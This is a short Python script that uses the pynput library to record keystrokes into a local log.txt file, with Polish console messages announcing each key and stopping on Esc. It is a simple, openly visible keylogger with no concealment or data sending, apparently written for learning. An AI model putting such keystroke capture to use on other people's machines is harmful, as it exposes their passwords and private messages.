from pynput.keyboard import Key, Listener
import os

print("Zapis do folderu:", os.getcwd())

def write_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")

        if k == "Key.space":
            f.write(" ")
            print("[ZAPISANO] spacja")
        elif "Key" not in k:
            f.write(k)
            print(f"[ZAPISANO] {k}")
        else:
            print(f"[POMINIETO] {k}")

def on_press(key):
    print(f"[WCISNIETO] {key}")
    write_file(key)

def on_release(key):
    if key == Key.esc:
        print("KONIEC")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 